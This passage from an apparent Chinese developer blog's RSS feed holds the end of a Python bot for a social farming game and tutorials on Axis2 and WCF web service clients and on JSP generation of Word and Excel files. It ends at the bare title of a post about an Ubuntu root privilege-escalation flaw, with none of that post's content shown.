&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=repertory&amp;act=getUserSeed&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 翻土<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def scarity(self,fid,place):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=scarify&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'ownerId':fid,'place':place}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 种植 cid: 种子编号 uid: 用户编号 place: 土地编号<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def seed(self,cid,uid,place):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=planting&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'cId':cid,'ownerId':uid,'place':place}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;# 偷好友的果子 fid:好友编号 place:土地编号<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def steal(self,fid,place):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://xn.hf.fminutes.com/api.php?mod=farmlandstatus&amp;act=scrounge&amp;farmKey=%s&amp;farmTime=%s&amp;inuId=' % self.param()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={"ownerId":fid,"place":place}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br><br>if __name__=='__main__':<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm = Farm()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.login("校内用户名","校内密码")<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.getFarm();<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.listFriends()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for f in farm.friends: #输出所有好友<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print f['userName']<br>#&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print farm.showFriend(f['userId']) #好友信息<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print farm.status<br>#&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.scarity(1842469710,0) <br>#&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.seed(2,1842469710,0)<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200961535618341/</guid>
    </item>
    <item>
      <title>
<![CDATA[使用Axis2开发Web Service客户端]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200846103922404/</link>
      <description>
<![CDATA[<P>4种方式，ADB，AXIOM，XMLBEANS，JIBX，后两种方式比较复杂。</P>  <P>ADB需要用Axis2提供的WSDL2Java生成Stub，然后调用的时候隐藏全部细节，调用方式很简单，和JDK6原生提供的方式很像。</P>  <P>AXIOM不需要wsdl2java，完全用axiom的类，封装不够好。</P>  <P>ADB，首先使用命令行生成wsdl对应的Java Stub和Callback文件</P>  <P>wsdl2java -uri <A rel="nofollow" href="http://localhost:8080/axis2/services/StockQuoteService?wsdl"  >http://localhost:8080/axis2/services/StockQuoteService?wsdl</A></P>  <P>ADBClient.java</P>  <P style="TEXT-INDENT: 2em;"  >  </P><P>package client;</P>  <P>import org.apache.axis2.StockQuoteServiceStub;</P>  <P>/**<BR>&nbsp;* First of all, go to cmd<BR>&nbsp;* set AXIS2_HOME=E:\programe\j2ee\axis2<BR>&nbsp;* wsdl2java -uri <A rel="nofollow" href="http://localhost:8080/axis2/services/StockQuoteService?wsdl"  >http://localhost:8080/axis2/services/StockQuoteService?wsdl</A><BR>&nbsp;* @author hankjin<BR>&nbsp;*<BR>&nbsp;*/<BR>public class ADBClient {<BR>&nbsp;public static void main(java.lang.String args[]){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StockQuoteServiceStub stub =<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new StockQuoteServiceStub();//("<A rel="nofollow" href="http://localhost:8080/axis2/services/StockQuoteService"  >http://localhost:8080/axis2/services/StockQuoteService</A>");</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; getPrice(stub);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; update(stub);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; getPrice(stub);</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch(Exception e){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println("\n\n\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; }</P>  <P>&nbsp;&nbsp;&nbsp; /* fire and forget */<BR>&nbsp;&nbsp;&nbsp; public static void update(StockQuoteServiceStub stub){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StockQuoteServiceStub.Update req = new StockQuoteServiceStub.Update();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.setSymbol ("ABC");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.setPrice (42.35);</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stub.update(req);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println("price updated");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch(Exception e){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println("\n\n\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; }</P>  <P>&nbsp;&nbsp;&nbsp; /* two way call/receive */<BR>&nbsp;&nbsp;&nbsp; public static void getPrice(StockQuoteServiceStub stub){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StockQuoteServiceStub.GetPrice req = new StockQuoteServiceStub.GetPrice();</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.setSymbol("ABC");</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StockQuoteServiceStub.GetPriceResponse res =<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stub.getPrice(req);</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println(res.get_return());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch(Exception e){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println("\n\n\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; }</P>  <P>}</P>  <P>&nbsp;</P>  <P>AXIOMClient.java</P>  <P>package client;<BR>/**<BR>&nbsp;* This method is simply but complex<BR>&nbsp;* simple is because it needs nothing<BR>&nbsp;* complex is because it has to build xml itself<BR>&nbsp;*/<BR>import org.apache.axiom.om.OMAbstractFactory;<BR>import org.apache.axiom.om.OMElement;<BR>import org.apache.axiom.om.OMFactory;<BR>import org.apache.axiom.om.OMNamespace;<BR>import org.apache.axis2.Constants;<BR>import org.apache.axis2.addressing.EndpointReference;<BR>import org.apache.axis2.client.Options;<BR>import org.apache.axis2.client.ServiceClient;</P>  <P>public class AXIOMClient {</P>  <P>&nbsp;&nbsp;&nbsp; private static EndpointReference targetEPR = <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new EndpointReference("<A rel="nofollow" href="http://localhost:8080/axis2/services/StockQuoteService"  >http://localhost:8080/axis2/services/StockQuoteService</A>");</P>  <P>&nbsp;&nbsp;&nbsp; public static OMElement getPricePayload(String symbol) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMFactory fac = OMAbstractFactory.getOMFactory();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMNamespace omNs = fac.createOMNamespace("<A rel="nofollow" href="http:///xsd"  >http:///xsd</A>", "tns");</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement method = fac.createOMElement("getPrice", omNs);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement value = fac.createOMElement("symbol", omNs);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; value.addChild(fac.createOMText(value, symbol));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; method.addChild(value);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return method;<BR>&nbsp;&nbsp;&nbsp; }</P>  <P>&nbsp;&nbsp;&nbsp; public static OMElement updatePayload(String symbol, double price) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMFactory fac = OMAbstractFactory.getOMFactory();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMNamespace omNs = fac.createOMNamespace("<A rel="nofollow" href="http:///xsd"  >http:///xsd</A>", "tns");</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement method = fac.createOMElement("update", omNs);</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement value1 = fac.createOMElement("symbol", omNs);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; value1.addChild(fac.createOMText(value1, symbol));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; method.addChild(value1);</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement value2 = fac.createOMElement("price", omNs);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; value2.addChild(fac.createOMText(value2,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Double.toString(price)));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; method.addChild(value2);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return method;<BR>&nbsp;&nbsp;&nbsp; }</P>  <P>&nbsp;&nbsp;&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement getPricePayload = getPricePayload("WSO");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement updatePayload = updatePayload("WSO", 123.42);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Options options = new Options();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; options.setTo(targetEPR);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; options.setTransportInProtocol(Constants.TRANSPORT_HTTP);</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ServiceClient sender = new ServiceClient();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sender.setOptions(options);</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sender.fireAndForget(updatePayload);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println("price updated");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement result = sender.sendReceive(getPricePayload);</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String response = result.getFirstElement().getText();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println("Current price of WSO: " + response);</P>  <P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch (Exception e) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; <BR>}<BR></P>  <P>&nbsp;</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200846103922404/</guid>
    </item>
    <item>
      <title>
<![CDATA[WCF之a+b]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720091131114751406/</link>
      <description>
<![CDATA[协议-实现-服务-客户<br>1. 协议<br>[ServiceContract(Name="CalculatorService", Namespace="http://ysmonk.appspot.com/")]<br>&nbsp;&nbsp;&nbsp; public interface ICalculator<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [OperationContract]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double Add(double x, double y);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [OperationContract]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double Subtract(double x, double y);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [OperationContract]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double Multiply(double x, double y);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [OperationContract]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double Divide(double x, double y);<br>&nbsp;&nbsp;&nbsp; }<br>2. 实现<br>&nbsp;&nbsp;&nbsp; public class CalculatorService:ICalculator<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public double Add(double x, double y)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return x + y;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public double Subtract(double x, double y)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return x - y;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public double Multiply(double x, double y)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return x * y;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public double Divide(double x, double y)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return x / y;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>3. 服务<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; static void Main(string[] args)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; using (ServiceHost host = new ServiceHost(typeof(CalculatorService)))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host.AddServiceEndpoint(typeof(ICalculator), new WSHttpBinding(),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "http://127.0.0.1:9999/calculatorservice");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*//服务描述，实现服务引用功能，类似web service的wsdl<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(host.Description.Behaviors.Find&lt;ServiceMetadataBehavior&gt;() == null)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ServiceMetadataBehavior beha<wbr>vior = new ServiceMetadataBehavior();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; beha<wbr>vior.HttpGetEnabled = true;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; beha<wbr>vior.HttpGetUrl = new Uri("http://127.0.0.1:9999/calculatorservice/metadata");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host.Description.Behaviors.Add(beha<wbr>vior);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }*/<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host.Opened += delegate<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine("CalcualtorService Started");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host.Open();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.Read();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>4. 客户<br>&lt;configuration&gt;<br>&nbsp;&nbsp;&nbsp; &lt;system.serviceModel&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;client&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;endpoint name="calcService" address="http://127.0.0.1:9999/calculatorservice" binding="wsHttpBinding" contract="Contracts.ICalculator" /&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/client&gt;<br>&nbsp;&nbsp;&nbsp; &lt;/system.serviceModel&gt;<br>&lt;/configuration&gt;<br><br>&nbsp;&nbsp;&nbsp; class Program<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; static void Main(string[] args)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; using (ChannelFactory&lt;ICalculator&gt; factory = new ChannelFactory&lt;ICalculator&gt;("calcService"))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ICalculator calc = factory.CreateChannel();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; using (calc as IDisposable)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine("2+3=" + calc.Add(2, 3));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720091131114751406/</guid>
    </item>
    <item>
      <title>
<![CDATA[使用JSP动态生成WORD和Excel文档]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200832311237189/</link>
      <description>
<![CDATA[<P>1。testDoc.jsp</P>  <P>新建Word文档test.doc，然后插入表格，输入个人信息<BR>&nbsp;文件-〉另存为testDoc.jsp<BR>&nbsp;打开testDoc.jsp，在第一行加入<BR>&lt;<A rel="nofollow" href="mailto:%@page"  >%@page</A> contentType="application/msword;charset=gb2312" %&gt; </P>  <P>2。testXls.jsp</P>  <P>新建Excel文档test.xls，然后插入数据<BR>&nbsp;文件-〉另存为testXls.jsp<BR>&nbsp;打开testXls.jsp，在第一行加入：<BR>&lt;<A rel="nofollow" href="mailto:%@page"  >%@page</A> contentType="application/vnd.ms-excel;charset=gb2312" %&gt;</P>  <P>然后在jsp页面中找到对应的字段用Jsp Script代替掉。</P>  <P>注：得到的doc为web版式视图，切换到页面视图即可<BR></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200832311237189/</guid>
    </item>
    <item>
      <title>
<![CDATA[ubuntu提升权限漏洞获取root]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010111010463570/</link>
      <description>
